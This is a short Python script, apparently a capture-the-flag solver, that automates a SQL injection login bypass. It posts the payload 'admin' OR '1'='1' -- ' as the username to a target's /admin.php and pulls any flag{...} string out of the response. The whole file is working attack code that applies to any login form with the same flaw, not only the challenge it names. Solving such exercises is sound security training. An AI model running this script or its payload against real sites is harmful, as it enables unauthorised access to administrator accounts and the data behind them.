# coding:utf-8
import requests
import sys
import re

"""
@文件命名：XBOX-039
@使用方式: python 039.py url
@简述思路: 自动化 SQL 注入，POST 提交恶意 username，尝试获取 FLAG
"""


def Scan(url):
    flag = ""
    try:
        target = url.rstrip("/") + "/admin.php"
        payload = {"username": "admin' OR '1'='1' -- ", "password": "123456"}
        resp = requests.post(target, data=payload, timeout=10)
        # 匹配 flag{} 或 FLAG{} 格式
        match = re.search(r"(flag|FLAG)\{.*?\}", resp.text)
        if match:
            flag = match.group(0)
        else:
            flag = "未找到flag"
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    print(Scan(url=sys.argv[1]))
